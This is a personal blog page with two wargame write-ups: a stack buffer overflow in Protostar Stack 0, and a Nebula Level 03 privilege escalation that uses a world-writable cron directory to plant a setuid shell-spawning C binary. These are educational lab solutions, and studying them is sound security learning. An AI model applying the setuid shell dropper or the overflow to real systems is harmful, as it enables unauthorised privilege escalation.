<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Álvaro Felipe Melchor &middot; Stuff about everything
    
    Álvaro Felipe Melchor
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/pic.png">
                                 <link rel="shortcut icon" href="/public/pic.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">

  <!--<link rel="stylesheet" href="/public/css/highlight/styles/monokai.css">
  <script src="/public/css/highlight/highlight.pack.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>-->

</head>


  <body>

    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          Álvaro Felipe Melchor
        </a>
      </h1>
      <p class="lead">Stuff about everything</p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item" href="/">Home</a>

      

      
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/about.html">About</a>
          
        
      
        
          
            <a class="sidebar-nav-item" href="/archive.html">Archive</a>
          
        
      
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      

      <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
    </nav>

    <p>&copy; 2015. All rights reserved.</p>
  </div>
</div>


    <div class="content container">
      <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/posts/protostartstack0">
        Stack 0 Protostart
      </a>
    </h1>

    <span class="post-date">14 Dec 2014</span>

    <p>I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.</p>

<p>The first exercise present a buffer overflow. The code is as follows.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>To resolve this puzzle we should have clear how is carried out the flow execution of a program. In the C language the stack is a structure that is used to pass argument to the function, save return address and also to save the local variables. So in the following C code the stack would be.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span> <span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">The stack grows downwards

+————————————+
| argument b |  The local variables are saved in reverse order.
+————————————+
| argument a |
+————————————+
| return     |  The return address is saved automatically by the 
| address    |  call instruction in assembly.
+————————————+
|            |  The base pointer register. Is used to reference 
|    EBP     |  inside the function without calculate offset 
|            |  respect with the ESP.
+————————————+
|  local c   |
+————————————+
</code></pre></div>
<p>The stack in the main function is.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">+————————————+
| argument 2 |  
+————————————+
| argument 1 |
+————————————+
| return     |  
| address    |  
+————————————+
|            |   
|    EBP     |   
|            |  
+————————————+
|  modified  |
+————————————+
|  buffer    |
+————————————+
</code></pre></div>
<p>So if we are able to write more than 64 bytes in buffer we can overwrite the value in <code>modified</code>. But Are we able to achieve that? The answers is yes due to the code is using an insecure function <code>gets</code>. It does not limit the input so we are able to write more than 64 bytes. So with the following we can change the value.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span> <span class="nb">printf</span> <span class="s2">&quot;%065x&quot;</span> 1
00000000000000000000000000000000000000000000000000000000000000001
<span class="nv">$ </span>./stack0
00000000000000000000000000000000000000000000000000000000000000001
you have changed the <span class="s1">&#39;modified&#39;</span> variable
</code></pre></div>
<p>If you want to augment your knowledge about stack and how to exploit it I encourage to read the article <a href="http://q.hscott.net/reads/stack_smashing.pdf">Smash the Stack For Fun And Profit by Aleph One</a></p>

<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/protostartstack0&text=Stack 0 Protostart&via=alvaro_fe">share it with your followers</a>
or
<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/posts/nebulalevel03">
        Nebula Level 03
      </a>
    </h1>

    <span class="post-date">14 Dec 2014</span>

    <p>In the challenge 3 there is a crontab called every couple of minutes for user <code>flag03</code>. The directory is as follows. </p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
total 9
drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
-rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
</code></pre></div>
<p>Is logical to think that the script that is executed each two minutes by crontab should be writable.sh.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>

<span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
    <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
    rm -f <span class="s2">&quot;$i&quot;</span>
<span class="k">done</span>
</code></pre></div>
<p>Basically the aim of this script is to execute all files in the writable.d directory. This directory has special permission since everyone can write or read in it as <code>/tmp</code>. We should achieve that the script <code>writable.sh</code> executes some binary and inherit its ownership. In that way if we can execute <code>/bin/sh</code> with the flag03 user we will be able to run <code>getflag</code> in a flag account.</p>

<p>All what we must do is write the following program in <code>/tmp</code> since anyone is able to write in it.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uid_t</span> <span class="n">euid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span> 
    <span class="kt">gid_t</span> <span class="n">egid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span> 
    <span class="n">setresgid</span><span class="p">(</span><span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">);</span>
    <span class="n">setresuid</span><span class="p">(</span><span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/tmp<span class="nv">$ </span>make pwned
cc     pwned.c   -o pwned
level03@nebula:/tmp<span class="nv">$ </span>cat execme
cp /tmp/pwned /home/flag03/pwned
chown flag03 /home/flag03/pwned
chmod u+s /home/flag03/pwned
level03@nebula:/tmp<span class="nv">$ </span>chmod +x execme
level03@nebula:/tmp<span class="nv">$ </span>cp execme /home/flag03/writable.d/
</code></pre></div>
<p>Copying the file execme in <code>/home/flag03/writable.d</code>, it will be execute each two minutes by the user <code>flag03</code>. Thanks to that,  the binary <code>pwned</code> in the <code>/home/flag03</code> will be set uid by the user <code>flag03</code> and when the user <code>level03</code> executes the binary it will run as <code>flag03</code>.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
total 9
-rwsrwxr-x <span class="m">1</span> flag03 flag03 <span class="m">7321</span> Dec <span class="m">14</span> 07:42 pwned
drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
-rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
level03@nebula:/home/flag03<span class="nv">$ </span>./pwned
sh-4.2<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>level03<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span>,1004<span class="o">(</span>level03<span class="o">)</span>
sh-4.2<span class="nv">$ </span>getflag
You have successfully executed getflag on a target account
</code></pre></div>
<blockquote>
<p>If you try run <code>writable.sh</code> by your own you execute everything with <code>level03</code> ownership. I had a problem due to crontab is wasn’t call so I had to configure it to work. All what you should do is the following in the terminal write <code>crontab -e</code> and configure the script to run as: <code>* * * * * flag03 /home/flag03/writable.sh</code>. With this the script will be run each minute by the user <code>flag03</code></p>
</blockquote>

<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel03&text=Nebula Level 03&via=alvaro_fe">share it with your followers</a>
or
<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>

  </div>
  
</div>

<div class="pagination">
  
    <a class="pagination-item older" href="/page4">Older</a>
  
  
    
      <a class="pagination-item newer" href="/page2">Newer</a>
    
  
</div>
    </div>

    

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-57722858-1', 'auto');
  ga('send', 'pageview');

</script>


  </body>
</html>
